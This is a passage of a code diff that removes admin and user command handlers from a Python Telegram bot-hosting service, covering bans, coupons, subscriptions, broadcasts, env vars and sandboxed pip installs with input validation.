-                    d["bots"].pop(b["_id"], None)
-            d["users"][target_uid_str]["plan"] = "free"
-            d["users"][target_uid_str]["plan_expiry"] = None
-            d["users"][target_uid_str]["wallet"] = 0
-            db_save(d)
-            audit(uid, "user_reset", f"uid={target_uid_str}")
-            USER_STATES.pop(uid, None)
-            bot.reply_to(m, f"{G['ok']} uid <code>{target_uid_str}</code> {sc('reset to free plan, all bots removed')}.",
-                         parse_mode="HTML")
-            return
-
-        if flow == "await_adm_bot_search":
-            if not is_admin(uid):
-                USER_STATES.pop(uid, None); return
-            q = (text or "").strip().lower()
-            bots = db_load()["bots"]
-            results = []
-            for bid, b in bots.items():
-                if q in bid.lower() or q in b.get("name", "").lower():
-                    running = bid in RUNNING and RUNNING[bid]["proc"].poll() is None
-                    results.append(
-                        f"{G['bullet']} <code>{bid}</code> <b>{esc(b.get('name','?'))}</b> "
-                        f"uid={b.get('owner')} "
-                        f"{'▶ running' if running else '⏹ stopped'}"
-                    )
-            USER_STATES.pop(uid, None)
-            reply = "\n".join(results[:10]) or f"<i>{sc('No bots found')}</i>"
-            bot.reply_to(m, f"<b>🔍 {sc('Bot Search')}</b>\n{G['div_eq']}\n{reply}",
-                         parse_mode="HTML")
-            return
-
-        if flow == "await_adm_whitelist":
-            if not is_admin(uid):
-                USER_STATES.pop(uid, None); return
-            parts = (text or "").strip().split(None, 1)
-            cmd = parts[0].lower() if parts else ""
-            target = parts[1].strip() if len(parts) > 1 else ""
-            wl = list(get_setting("scan_whitelist", []) or [])
-            if cmd == "add" and target:
-                if target not in wl:
-                    wl.append(target)
-                set_setting("scan_whitelist", wl)
-                audit(uid, "whitelist_add", target)
-                bot.reply_to(m, f"{G['ok']} <code>{esc(target)}</code> {sc('added to whitelist')}.",
-                             parse_mode="HTML")
-            elif cmd == "del" and target:
-                if target in wl:
-                    wl.remove(target)
-                set_setting("scan_whitelist", wl)
-                audit(uid, "whitelist_del", target)
-                bot.reply_to(m, f"{G['ok']} <code>{esc(target)}</code> {sc('removed from whitelist')}.",
-                             parse_mode="HTML")
-            else:
-                bot.reply_to(m, f"{G['no']} {sc('Use')}: <code>add uid</code> {sc('or')} <code>del uid</code>",
-                             parse_mode="HTML")
-            USER_STATES.pop(uid, None)
-            return
-
-        if flow == "await_adm_blacklist":
-            if not is_admin(uid):
-                USER_STATES.pop(uid, None); return
-            parts = (text or "").strip().split(None, 1)
-            cmd = parts[0].lower() if parts else ""
-            domain = parts[1].strip() if len(parts) > 1 else ""
-            bl = list(get_setting("domain_blacklist", []) or [])
-            if cmd == "add" and domain:
-                if domain not in bl:
-                    bl.append(domain)
-                set_setting("domain_blacklist", bl)
-                audit(uid, "blacklist_add", domain)
-                bot.reply_to(m, f"{G['ok']} <code>{esc(domain)}</code> {sc('added to blacklist')}.",
-                             parse_mode="HTML")
-            elif cmd == "del" and domain:
-                if domain in bl:
-                    bl.remove(domain)
-                set_setting("domain_blacklist", bl)
-                audit(uid, "blacklist_del", domain)
-                bot.reply_to(m, f"{G['ok']} <code>{esc(domain)}</code> {sc('removed')}.",
-                             parse_mode="HTML")
-            else:
-                bot.reply_to(m, f"{G['no']} {sc('Use')}: <code>add domain.com</code> {sc('or')} <code>del domain.com</code>",
-                             parse_mode="HTML")
-            USER_STATES.pop(uid, None)
-            return
-
-        if flow == "await_adm_notify_running":
-            if not is_admin(uid):
-                USER_STATES.pop(uid, None); return
-            target_uids: List[str] = st.get("target_uids", [])
-            msg_text = (text or "").strip()
-            USER_STATES.pop(uid, None)
-            if not msg_text:
-                bot.reply_to(m, f"{G['no']} {sc('Empty message — cancelled')}."); return
-            def _bg_nr() -> None:
-                sent = fail = 0
-                for t_uid in target_uids:
-                    try:
-                        bot.send_message(int(t_uid),
-                                         f"<b>📢 {sc('Admin Message')}</b>\n{G['div']}\n{esc(msg_text)}",
-                                         parse_mode="HTML")
-                        sent += 1
-                    except Exception:
-                        fail += 1
-                audit(uid, "notify_targeted", f"sent={sent} fail={fail}")
-                try:
-                    bot.send_message(uid, f"{G['ok']} {sc('Sent to')} {sent} {sc('users')} ({fail} {sc('failed')}).")
-                except Exception:
-                    pass
-            threading.Thread(target=_bg_nr, daemon=True).start()
-            bot.reply_to(m, f"{G['ok']} {sc('Sending to')} {len(target_uids)} {sc('users')}…")
-            return
-
-        if flow == "await_adm_quick_announce":
-            if not is_owner(uid):
-                USER_STATES.pop(uid, None); return
-            msg_text = (text or "").strip()
-            USER_STATES.pop(uid, None)
-            if not msg_text or not ANNOUNCE_CHANNEL:
-                bot.reply_to(m, f"{G['no']} {sc('No message or channel not configured')}."); return
-            try:
-                sent = bot.send_message(ANNOUNCE_CHANNEL,
-                                        f"📣 <b>{BRAND_TAG}</b>\n{G['div']}\n{esc(msg_text)}",
-                                        parse_mode="HTML")
-                try:
-                    bot.pin_chat_message(ANNOUNCE_CHANNEL, sent.message_id)
-                except Exception:
-                    pass
-                audit(uid, "quick_announce", "")
-                bot.reply_to(m, f"{G['ok']} {sc('Announced and pinned')}.")
-            except Exception as _qe:
-                bot.reply_to(m, f"{G['no']} {sc('Failed')}: <code>{esc(_qe)}</code>",
-                             parse_mode="HTML")
-            return
-
-        # ─── MEGA ADVANCED PANEL FLOWS ────────────────────────────────────
-        if flow == "await_adm_bc_set":
-            if not is_admin(uid): USER_STATES.pop(uid, None); return
-            key = state.get("bc_key", "")
-            val = text.strip()
-            # Try int conversion if it looks numeric
-            try:
-                val_store: Any = int(val)
-            except ValueError:
-                val_store = val
-            set_setting(f"bc_{key}", val_store)
-            audit(uid, f"bc_set_{key}", str(val_store)[:40])
-            USER_STATES.pop(uid, None)
-            bot.reply_to(m, f"{G['ok']} <b><code>{esc(key)}</code></b> = <code>{esc(str(val_store))}</code>",
-                         parse_mode="HTML")
-            return
-
-        if flow == "await_adm_emoji_set":
-            if not is_admin(uid): USER_STATES.pop(uid, None); return
-            key = state.get("emoji_key", "")
-            emoji_val = text.strip()
-            USER_STATES.pop(uid, None)
-            if not key:
-                bot.reply_to(m, f"{G['no']} Bad state."); return
-            if emoji_val == "-":
-                custom = get_setting("custom_emojis", {}) or {}
-                custom.pop(key, None)
-                set_setting("custom_emojis", custom)
-                bot.reply_to(m, f"{G['ok']} {sc('Reset')} <code>{esc(key)}</code> to default.", parse_mode="HTML")
-            else:
-                custom = get_setting("custom_emojis", {}) or {}
-                custom[key] = emoji_val
-                set_setting("custom_emojis", custom)
-                audit(uid, f"emoji_set_{key}", emoji_val)
-                bot.reply_to(m, f"{G['ok']} <code>{esc(key)}</code> = {emoji_val}", parse_mode="HTML")
-            return
-
-        if flow == "await_adm_tmpl_edit":
-            if not is_admin(uid): USER_STATES.pop(uid, None); return
-            key = state.get("tmpl_key", "")
-            val = text.strip()
-            USER_STATES.pop(uid, None)
-            if not key:
-                bot.reply_to(m, f"{G['no']} Bad state."); return
-            set_setting(f"tmpl_{key}", val)
-            audit(uid, f"tmpl_set_{key}", val[:40])
-            bot.reply_to(m, f"{G['ok']} {sc('Template')} <code>{esc(key)}</code> {sc('updated')}.",
-                         parse_mode="HTML")
-            return
-
-        if flow == "await_adm_ref_reward":
-            if not is_admin(uid): USER_STATES.pop(uid, None); return
-            USER_STATES.pop(uid, None)
-            try:
-                amount = int(text.strip())
-                set_setting("referral_reward_amount", amount)
-                audit(uid, "ref_reward_set", str(amount))
-                bot.reply_to(m, f"{G['ok']} {sc('Referral reward set to')} {amount}৳")
-            except ValueError:
-                bot.reply_to(m, f"{G['no']} {sc('Please send a valid integer.')}")
-            return
-
-        if flow == "await_adm_ref_min_plan":
-            if not is_admin(uid): USER_STATES.pop(uid, None); return
-            plan = text.strip().lower()
-            USER_STATES.pop(uid, None)
-            if plan not in PLAN_LIMITS:
-                bot.reply_to(m, f"{G['no']} {sc('Invalid plan')}. {sc('Valid')}: {', '.join(PLAN_LIMITS.keys())}"); return
-            set_setting("referral_min_plan", plan)
-            audit(uid, "ref_min_plan_set", plan)
-            bot.reply_to(m, f"{G['ok']} {sc('Min plan for referrals')}: {plan}")
-            return
-
-        if flow == "await_adm_wh_set":
-            if not is_admin(uid): USER_STATES.pop(uid, None); return
-            url = text.strip()
-            USER_STATES.pop(uid, None)
-            if not url.startswith("https://"):
-                bot.reply_to(m, f"{G['no']} {sc('Webhook URL must start with https://')}"); return
-            try:
-                bot.set_webhook(url)
-                set_setting("webhook_url", url)
-                audit(uid, "wh_set", url[:80])
-                bot.reply_to(m, f"{G['ok']} {sc('Webhook set')}: <code>{esc(url)}</code>", parse_mode="HTML")
-            except Exception as _whe:
-                bot.reply_to(m, f"{G['no']} {sc('Failed')}: <code>{esc(_whe)}</code>", parse_mode="HTML")
-            return
-
-        if flow == "await_adm_rate_set":
-            if not is_admin(uid): USER_STATES.pop(uid, None); return
-            rate_key = state.get("rate_key", "")
-            USER_STATES.pop(uid, None)
-            try:
-                parts = rate_key.split("_", 1)
-                plan_key, metric = parts[0], parts[1] if len(parts) > 1 else ""
-                val = int(text.strip())
-                set_setting(f"rl_{plan_key}_{metric}", val)
-                audit(uid, f"rate_set_{rate_key}", str(val))
-                bot.reply_to(m, f"{G['ok']} <code>{esc(rate_key)}</code> = {val}", parse_mode="HTML")
-            except Exception as _rse:
-                bot.reply_to(m, f"{G['no']} {sc('Error')}: {_rse}")
-            return
-
-        if flow == "await_adm_goal_set":
-            if not is_admin(uid): USER_STATES.pop(uid, None); return
-            goal_type = state.get("goal_type", "monthly")
-            USER_STATES.pop(uid, None)
-            try:
-                amount = int(text.strip())
-                key = "rev_goal_monthly" if goal_type == "monthly" else "rev_goal_yearly"
-                set_setting(key, amount)
-                audit(uid, f"goal_set_{goal_type}", str(amount))
-                bot.reply_to(m, f"{G['ok']} {goal_type.title()} {sc('goal set to')} {amount}৳")
-            except ValueError:
-                bot.reply_to(m, f"{G['no']} {sc('Please send a valid integer.')}")
-            return
-
-        if flow == "await_adm_sched_add":
-            if not is_admin(uid): USER_STATES.pop(uid, None); return
-            raw = text.strip()
-            USER_STATES.pop(uid, None)
-            # Format: "HH:MM daily Message" or "YYYY-MM-DD HH:MM once Message"
-            parts = raw.split(" ", 2)
-            try:
-                if len(parts) < 3:
-                    raise ValueError("Need at least 3 parts")
-                if len(parts[0]) == 5 and parts[0].count(":") == 1:  # HH:MM daily ...
-                    ttime, ttype, msg = parts[0], parts[1], parts[2]
-                    if ttype not in ("daily", "once", "weekly"):
-                        ttype = "daily"
-                elif len(parts[0]) == 10:  # YYYY-MM-DD HH:MM once ...
-                    rest = raw.split(" ", 3)
-                    ttime = f"{rest[0]} {rest[1]}"
-                    ttype = rest[2] if len(rest) > 2 else "once"
-                    msg   = rest[3] if len(rest) > 3 else ""
-                else:
-                    raise ValueError("Bad format")
-                tasks = get_setting("scheduled_tasks", []) or []
-                new_task: Dict[str, Any] = {
-                    "id":      secrets.token_hex(6),
-                    "time":    ttime,
-                    "type":    ttype,
-                    "msg":     msg,
-                    "enabled": True,
-                    "created": ts_iso(),
-                    "creator": uid,
-                }
-                tasks.append(new_task)
-                set_setting("scheduled_tasks", tasks)
-                audit(uid, "sched_add", f"{ttype}@{ttime}")
-                bot.reply_to(m, f"{G['ok']} {sc('Scheduled task added')}: "
-                                f"<code>{esc(ttype)} {esc(ttime)}: {esc(msg[:50])}</code>",
-                             parse_mode="HTML")
-            except Exception as _ste:
-                bot.reply_to(m, f"{G['no']} {sc('Bad format. Use')}: <code>HH:MM daily Your message</code>",
-                             parse_mode="HTML")
-            return
-
-        if flow == "await_adm_coupon_bulk":
-            if not is_admin(uid): USER_STATES.pop(uid, None); return
-            raw = text.strip()
-            USER_STATES.pop(uid, None)
-            # Format: count plan discount_pct [max_uses] [days_valid]
-            parts = raw.split()
-            try:
-                count    = int(parts[0]) if parts else 1
-                plan_key = parts[1] if len(parts) > 1 else "free"
-                disc_pct = int(parts[2]) if len(parts) > 2 else 10
-                max_uses = int(parts[3]) if len(parts) > 3 else 1
-                days_val = int(parts[4]) if len(parts) > 4 else 30
-                if plan_key not in PLAN_LIMITS:
-                    bot.reply_to(m, f"{G['no']} {sc('Invalid plan')}."); return
-                count = min(count, 100)  # cap at 100
-                d = db_load()
-                created_codes: List[str] = []
-                expiry_ts = (now_utc() + timedelta(days=days_val)).isoformat()
-                for _ in range(count):
-                    code = secrets.token_urlsafe(8).upper()
-                    d["coupons"][code] = {
-                        "plan":       plan_key,
-                        "pct":        disc_pct,
-                        "max_uses":   max_uses,
-                        "uses_left":  max_uses,
-                        "expiry":     expiry_ts,
-                        "created_by": uid,
-                        "created_at": ts_iso(),
-                    }
-                    created_codes.append(code)
-                db_save(d)
-                audit(uid, "coupon_bulk", f"count={count} plan={plan_key} disc={disc_pct}%")
-                codes_text = "\n".join(created_codes[:20])
-                bot.reply_to(m, f"{G['ok']} <b>{count}</b> {sc('coupons created')}!\n"
-                                f"<code>{esc(codes_text)}</code>"
-                                + (f"\n<i>...and {count-20} more</i>" if count > 20 else ""),
-                             parse_mode="HTML")
-            except Exception as _cbe:
-                bot.reply_to(m, f"{G['no']} {sc('Error')}: {_cbe}\n"
-                                f"{sc('Format')}: <code>count plan discount_pct max_uses days_valid</code>",
-                             parse_mode="HTML")
-            return
-
-        if flow == "await_adm_factory_reset":
-            if not is_owner(uid): USER_STATES.pop(uid, None); return
-            USER_STATES.pop(uid, None)
-            if text.strip() != "CONFIRM RESET":
-                bot.reply_to(m, f"{G['no']} {sc('Cancelled — must send exactly')} "
-                                f"<code>CONFIRM RESET</code>.", parse_mode="HTML")
-                return
-            try:
-                if SETTINGS_FILE.exists():
-                    SETTINGS_FILE.write_text("{}", encoding="utf-8")
-                audit(uid, "factory_reset", "settings wiped")
-                bot.reply_to(m, f"♻️ {sc('Factory reset done — all settings wiped. Bot restart recommended.')}")
-            except Exception as _fre:
-                bot.reply_to(m, f"{G['no']} {sc('Error')}: {_fre}")
-            return
-
-        if flow == "await_adm_sub_extend":
-            if not is_admin(uid): USER_STATES.pop(uid, None); return
-            USER_STATES.pop(uid, None)
-            parts = text.strip().split()
-            try:
-                target_uid = parts[0]
-                extra_days = int(parts[1]) if len(parts) > 1 else 30
-                d = db_load()
-                u = d["users"].get(str(target_uid))
-                if not u:
-                    bot.reply_to(m, f"{G['no']} {sc('User not found')}: {esc(target_uid)}"); return
-                cur_exp = u.get("plan_expiry")
-                if cur_exp and cur_exp > ts_iso():
-                    base = datetime.fromisoformat(cur_exp.replace("Z",""))
-                else:
-                    base = now_utc().replace(tzinfo=None)
-                new_exp = (base + timedelta(days=extra_days)).isoformat()
-                u["plan_expiry"] = new_exp
-                db_save(d)
-                audit(uid, "sub_extend", f"uid={target_uid} days={extra_days}")
-                bot.reply_to(m, f"{G['ok']} {sc('Subscription extended by')} {extra_days} "
-                                f"{sc('days. New expiry')}: {new_exp[:10]}")
-                try:
-                    bot.send_message(int(target_uid),
-                                     f"🎁 {sc('Your subscription has been extended by')} "
-                                     f"{extra_days} {sc('days by admin!')}")
-                except Exception:
-                    pass
-            except Exception as _see:
-                bot.reply_to(m, f"{G['no']} {sc('Error')}: {_see}\n"
-                                f"{sc('Format')}: <code>uid days</code>")
-            return
-
-        if flow == "await_adm_sub_history":
-            if not is_admin(uid): USER_STATES.pop(uid, None); return
-            USER_STATES.pop(uid, None)
-            target_uid = text.strip()
-            d = db_load()
-            u = d["users"].get(str(target_uid))
-            if not u:
-                bot.reply_to(m, f"{G['no']} {sc('User not found')}: {esc(target_uid)}"); return
-            pays = [p for p in d["payments"]
-                    if str(p.get("uid","")) == str(target_uid)
-                    and p.get("status") == "approved"]
-            pays.sort(key=lambda x: x.get("ts",""), reverse=True)
-            rows = "\n".join(
-                f"{G['bullet']} {str(p.get('ts','?'))[:10]} "
-                f"<b>{p.get('plan','?')}</b> {p.get('amount','?')}৳"
-                for p in pays[:15]
-            ) or f"<i>{sc('No payment history')}</i>"
-            cap = (
-                f"<b>📋 {sc('Sub History')}: {esc(u.get('name','?'))}</b>\n"
-                f"{G['div_eq']}\n"
-                f"{bullet('Current Plan', u.get('plan','free'))}\n"
-                f"{bullet('Expiry',       str(u.get('plan_expiry','—'))[:10])}\n"
-                f"{G['div']}\n{rows}"
-            )
-            bot.reply_to(m, cap, parse_mode="HTML")
-            return
-
-        if flow == "await_adm_pay_number":
-            if not is_admin(uid): USER_STATES.pop(uid, None); return
-            pm_key = state.get("pm_key", "")
-            new_num = text.strip()
-            USER_STATES.pop(uid, None)
-            if not pm_key or not new_num:
-                bot.reply_to(m, f"{G['no']} {sc('Bad state.')}"); return
-            set_setting(f"pm_number_{pm_key}", new_num)
-            PAYMENT_METHODS.get(pm_key, {})["number"] = new_num
-            audit(uid, f"pm_number_{pm_key}", new_num[:40])
-            bot.reply_to(m, f"{G['ok']} {sc('Number updated for')} "
-                            f"<b>{esc(PAYMENT_METHODS.get(pm_key,{}).get('name',pm_key))}</b>",
-                         parse_mode="HTML")
-            return
-
-        if flow == "await_adm_bot_env_edit":
-            if not is_admin(uid): USER_STATES.pop(uid, None); return
-            bot_id = state.get("bot_id", "")
-            raw    = text.strip()
-            USER_STATES.pop(uid, None)
-            b = find_bot(bot_id)
-            if not b:
-                bot.reply_to(m, f"{G['no']} {sc('Bot not found.')}", parse_mode="HTML"); return
-            d = db_load()
-            env = dict(b.get("env", {}))
-            if raw.startswith("del "):
-                del_key = raw[4:].strip()
-                env.pop(del_key, None)
-                action = f"del {del_key}"
-            elif "=" in raw:
-                k, v = raw.split("=", 1)
-                k = k.strip(); v = v.strip()
-                if k in SECRET_ENV_NAMES:
-                    bot.reply_to(m, f"{G['no']} {sc('Cannot set secret env var via bot.')}"); return
-                env[k] = v
-                action = f"set {k}"
-            else:
-                bot.reply_to(m, f"{G['no']} {sc('Format')}: <code>KEY=value</code> {sc('or')} <code>del KEY</code>",
-                             parse_mode="HTML"); return
-            d["bots"][bot_id]["env"] = env
-            db_save(d)
-            audit(uid, f"bot_env_edit_{bot_id[:8]}", action)
-            bot.reply_to(m, f"{G['ok']} {sc('Env updated')}: <code>{esc(action)}</code>",
-                         parse_mode="HTML")
-            return
-
-    except Exception as e:
-        traceback.print_exc()
-        bot.reply_to(m, f"{G['no']} {sc('error')}: <code>{esc(e)}</code>", parse_mode="HTML")
-
-
-# ═════════════════════════════════════════════════════════════════
-# 22.5  APPROVAL SYSTEM (admin-gated bot uploads)
-# ═════════════════════════════════════════════════════════════════
-#
-# When admin toggles "Approval Mode: ON", every uploaded bot is held
-# until an admin Approves or Rejects it. While pending, the bot is
-# NEVER auto-started, even if its files decrypt cleanly.
-#
-# storage layout:
-#   settings.approval_required          : bool (default True)
-#   settings.pending_uploads            : { bot_id -> { file_id, msg_id,
-#                                                       chat_id, user_id, name,
-#                                                       file_count, size,
-#                                                       file_name, ts } }
-# bot doc:
-#   doc["approval_status"]   : "pending" | "approved" | "rejected" | None
-#   doc["approval_reason"]   : str (filled when rejected)
 # ═════════════════════════════════════════════════════════════════
 
 def approval_required() -> bool:
@@ -12006,283 +8174,12 @@ def _handle_bot_upload(m: types.Message) -> None:
 
 
 # ─── env vars flow ────────────────────────────────────────────────
-def _handle_env_kv(m: types.Message, st: Dict[str, Any]) -> None:
-    text = m.text.strip()
-    if "=" not in text:
-        bot.reply_to(m, f"{G['no']} {sc('Use')} <code>Kᴇʏ=Vᴀʟᴜᴇ</code>.", parse_mode="HTML"); return
-    key, _, value = text.partition("=")
-    key = key.strip(); value = value.strip()
-    if not re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", key):
-        bot.reply_to(m, f"{G['no']} {sc('Invalid key')}."); return
-    if key in SECRET_ENV_NAMES:
-        bot.reply_to(m, f"{G['no']} {sc('That env name is protected')}."); return
-    b = find_bot(st["bot_id"])
-    if not b:
-        bot.reply_to(m, f"{G['no']} {sc('Bot not found')}."); return
-    env = b.get("env") or {}
-    env[key] = value
-    b["env"] = env
-    save_bot(b)
-    USER_STATES.pop(m.from_user.id, None)
-    bot.reply_to(m, f"{G['ok']} {sc('Saved')} <code>{esc(key)}</code>", parse_mode="HTML")
-
-
 # ─── pip install flow ─────────────────────────────────────────────
-def _handle_pip_install(m: types.Message, st: Dict[str, Any]) -> None:
-    text = (m.text or "").strip()
-    USER_STATES.pop(m.from_user.id, None)
-    if not text:
-        bot.reply_to(m, f"{G['no']} {sc('Nothing to install')}."); return
-    # only allow safe package spec characters; block flags/shell metas
-    pkgs = [p for p in text.split() if p]
-    bad = [p for p in pkgs if not re.match(r"^[A-Za-z0-9_\-\.\[\]=<>!~,+]+$", p) or p.startswith("-")]
-    if bad:
-        bot.reply_to(
-            m,
-            f"{G['no']} {sc('Invalid package spec')}: <code>{esc(' '.join(bad))}</code>",
-            parse_mode="HTML",
-        ); return
-    if len(pkgs) > 15:
-        bot.reply_to(m, f"{G['no']} {sc('Too many packages at once (max 15)')}."); return
-    b = find_bot(st["bot_id"])
-    if not b:
-        bot.reply_to(m, f"{G['no']} {sc('Bot not found')}."); return
-    if b["owner"] != m.from_user.id and not is_admin(m.from_user.id):
-        bot.reply_to(m, f"{G['no']} {sc('Not yours')}."); return
-    # Use the bot's own sandbox dir — installing into a fixed `ROOT/bots/...`
-    # used to NameError out, then fall back to root site-packages, which on
-    # most hosts requires sudo. `--target deps_dir` keeps everything in the
-    # bot's own folder so no permissions are ever needed.
-    bot_dir = Path(b["dir"])
-    deps_dir = bot_dir / ".deps"
-    deps_dir.mkdir(parents=True, exist_ok=True)
-    status = bot.reply_to(
-        m,
-        f"{G['refresh']} {sc('Installing')} <code>{esc(' '.join(pkgs))}</code> ...",
-        parse_mode="HTML",
-    )
-    pip_env = _pip_env(deps_dir)
-    try:
-        proc = subprocess.run(
-            [sys.executable, "-m", "pip", "install",
-             "--target", str(deps_dir), *_PIP_BASE_FLAGS] + pkgs,
-            capture_output=True, text=True, timeout=180, env=pip_env,
-        )
-        ok = (proc.returncode == 0)
-        out = (proc.stdout or "") + "\n" + (proc.stderr or "")
-        tail = "\n".join([ln for ln in out.splitlines() if ln.strip()][-10:])[:1500]
-        head = f"{G['ok']} {sc('Installed')}" if ok else f"{G['no']} {sc('Install failed')}"
-        try:
-            bot.edit_message_text(
-                f"<b>{head}</b>\n"
-                f"{G['div']}\n"
-                f"<b>{sc('Packages')}:</b> <code>{esc(' '.join(pkgs))}</code>\n"
-                f"<pre>{esc(tail) or '(no output)'}</pre>",
-                chat_id=status.chat.id, message_id=status.message_id,
-                parse_mode="HTML",
-            )
-        except Exception:
-            bot.send_message(m.chat.id, f"{head}\n<pre>{esc(tail)}</pre>", parse_mode="HTML")
-        audit(m.from_user.id, "pip_install",
-              f"bot={b['_id']} pkgs={' '.join(pkgs)} rc={proc.returncode}")
-    except subprocess.TimeoutExpired:
-        bot.send_message(m.chat.id, f"{G['no']} {sc('Install timed out after 180s')}.")
-    except Exception as e:
-        bot.send_message(m.chat.id, f"{G['no']} {sc('Install error')}: <code>{esc(str(e))}</code>", parse_mode="HTML")
-
-
 # ─── cron flow ────────────────────────────────────────────────────
-def _handle_cron(m: types.Message, st: Dict[str, Any]) -> None:
-    text = m.text.strip().lower()
-    b = find_bot(st["bot_id"])
-    if not b:
-        bot.reply_to(m, f"{G['no']} {sc('Bot not found')}."); return
-    if text == "off":
-        b["cron"] = {}; save_bot(b); USER_STATES.pop(m.from_user.id, None)
-        bot.reply_to(m, f"{G['ok']} {sc('Cron disabled')}"); return
-    cron = b.get("cron") or {}
-    for tok in text.split():
-        if "=" not in tok:
-            continue
-        k, v = tok.split("=", 1)
-        if k not in {"restart", "backup"}:
-            continue
-        try:
-            iv = int(v)
-        except Exception:
-            continue
-        if iv <= 0:
-            continue
-        cron[f"{k}_hours"] = iv
-    b["cron"] = cron
-    save_bot(b)
-    USER_STATES.pop(m.from_user.id, None)
-    bot.reply_to(m, f"{G['ok']} {sc('Cron updated')}: <code>{esc(json.dumps(cron))}</code>",
-                 parse_mode="HTML")
-
-
 # ─── admin: find user ─────────────────────────────────────────────
-def _handle_admin_finduser(m: types.Message) -> None:
-    if not is_admin(m.from_user.id):
-        return
-    USER_STATES.pop(m.from_user.id, None)
-    text = m.text.strip()
-    if not text.lstrip("@").lstrip("-").isdigit() and not text.startswith("@"):
-        return
-    d = db_load()
-    target = None
-    if text.startswith("@"):
-        for u in d["users"].values():
-            if (u.get("username") or "").lower() == text[1:].lower():
-                target = u; break
-    else:
-        try:
-            target = d["users"].get(str(int(text)))
-        except Exception:
-            target = None
-    if not target:
-        bot.reply_to(m, f"{G['no']} {sc('No such user')}."); return
-    bots = list_user_bots(target["_id"])
-    txt = (
-        f"<b>{G['user']} {sc('User')} {target['_id']}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Name',     target.get('name'))}\n"
-        f"{bullet('Username', '@' + (target.get('username') or '—'))}\n"
-        f"{bullet('Plan',     PLAN_LIMITS.get(target.get('plan'), {}).get('name'))}\n"
-        f"{bullet('Until',    fmt_ts(target.get('plan_expires')))}\n"
-        f"{bullet('Wallet',   '{}$'.format(target.get('wallet', 0)))}\n"
-        f"{bullet('Banned',   target.get('banned'))}\n"
-        f"{bullet('KYC',      target.get('kyc'))}\n"
-        f"{bullet('Bots',     len(bots))}\n"
-        f"{bullet('Joined',   fmt_ts(target.get('joined')))}\n"
-        f"{bullet('LastSeen', fmt_ts(target.get('last_seen')))}\n"
-        f"{bullet('Note',     d.get('notes', {}).get(str(target['_id']), '—'))}\n"
-        f"{G['div']}{FOOTER}"
-    )
-    bot.reply_to(m, txt, parse_mode="HTML", reply_markup=back_admin_kb())
-
-
 # ─── admin: ban / unban ──────────────────────────────────────────
-def _handle_ban_cmd(m: types.Message) -> None:
-    if not is_admin(m.from_user.id):
-        return
-    if not admin_can(m.from_user.id, "ban_user"):
-        bot.reply_to(m, f"{G['no']} {sc('insufficient permission')}"); return
-    USER_STATES.pop(m.from_user.id, None)
-    parts = m.text.split(maxsplit=2)
-    if len(parts) < 2:
-        bot.reply_to(m, f"{G['no']} {sc('format')}: <code>Bᴀɴ &lt;Uɪᴅ&gt; &lt;Rᴇᴀꜱᴏɴ&gt;</code>",
-                     parse_mode="HTML"); return
-    op = parts[0].lower()
-    try:
-        uid = int(parts[1])
-    except Exception:
-        bot.reply_to(m, f"{G['no']} {sc('bad uid')}"); return
-    reason = parts[2] if len(parts) > 2 else ""
-    d = db_load()
-    if str(uid) not in d["users"]:
-        bot.reply_to(m, f"{G['no']} {sc('no such user')}"); return
-    if op == "ban":
-        d["users"][str(uid)]["banned"] = True
-        d["users"][str(uid)]["ban_reason"] = reason
-        db_save(d)
-        audit(m.from_user.id, "ban_user", f"uid={uid} reason={reason}")
-        try:
-            bot.send_message(uid,
-                             f"<b>{G['no']} {sc('You have been banned')}</b>\n{bullet('Reason', reason)}",
-                             parse_mode="HTML")
-        except Exception:
-            pass
-        bot.reply_to(m, f"{G['ok']} {sc('banned')} {uid}"); return
-    if op == "unban":
-        d["users"][str(uid)]["banned"] = False
-        d["users"][str(uid)]["ban_reason"] = ""
-        db_save(d)
-        audit(m.from_user.id, "unban_user", f"uid={uid}")
-        try:
-            bot.send_message(uid,
-                             f"<b>{G['ok']} {sc('You have been unbanned')}</b>",
-                             parse_mode="HTML")
-        except Exception:
-            pass
-        bot.reply_to(m, f"{G['ok']} {sc('unbanned')} {uid}"); return
-
-
 # ─── admin: give plan ─────────────────────────────────────────────
-def _handle_giveplan_cmd(m: types.Message) -> None:
-    if not is_admin(m.from_user.id):
-        return
-    if not admin_can(m.from_user.id, "give_plan"):
-        bot.reply_to(m, f"{G['no']} {sc('insufficient permission')}"); return
-    USER_STATES.pop(m.from_user.id, None)
-    parts = m.text.split()
-    if len(parts) < 2:
-        bot.reply_to(m, f"{G['no']} {sc('format')}: <code>Uɪᴅ Pʟᴀɴ [Dᴀʏꜱ]</code>",
-                     parse_mode="HTML"); return
-    try:
-        uid = int(parts[0])
-    except Exception:
-        bot.reply_to(m, f"{G['no']} {sc('bad uid')}"); return
-    plan = parts[1]
-    if plan not in PLAN_LIMITS:
-        bot.reply_to(m, f"{G['no']} {sc('bad plan')}"); return
-    days = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else None
-    if not grant_plan(uid, plan, days=days):
-        bot.reply_to(m, f"{G['no']} {sc('failed')}"); return
-    audit(m.from_user.id, "give_plan", f"uid={uid} plan={plan} days={days}")
-    bot.reply_to(m, f"{G['ok']} {sc('granted')} {plan} {sc('to')} {uid}")
-
-
 # ─── admin: broadcast ─────────────────────────────────────────────
-def _handle_broadcast(m: types.Message) -> None:
-    if not is_admin(m.from_user.id):
-        return
-    USER_STATES.pop(m.from_user.id, None)
-    text = m.text or ""
-    target_plan: Optional[str] = None
-    schedule_at: Optional[datetime] = None
-
-    # parse first-line directives
-    while True:
-        head, _, rest = text.partition("\n")
-        head = head.strip()
-        if head.startswith("plan:"):
-            target_plan = head.split(":", 1)[1].strip().lower()
-            text = rest
-        elif head.startswith("at:"):
-            try:
-                schedule_at = datetime.strptime(head[3:].strip(),
-                                                "%Y-%m-%d %H:%M").replace(tzinfo=timezone.utc)
-            except Exception:
-                bot.reply_to(m, f"{G['no']} {sc('bad time format, use YYYY-MM-DD HH:MM UTC')}")
-                return
-            text = rest
-        else:
-            break
-
-    text = text.strip()
-    if not text:
-        bot.reply_to(m, f"{G['no']} {sc('empty broadcast')}"); return
-
-    if schedule_at:
-        d = db_load()
-        d["scheduled_broadcasts"].append({
-            "at": schedule_at.isoformat(),
-            "text": text,
-            "plan": target_plan,
-            "by": m.from_user.id,
-        })
-        db_save(d)
-        audit(m.from_user.id, "broadcast_schedule",
-              f"at={schedule_at.isoformat()} plan={target_plan}")
-        bot.reply_to(m, f"{G['ok']} {sc('scheduled for')} {fmt_ts(schedule_at.isoformat())}")
-        return
-
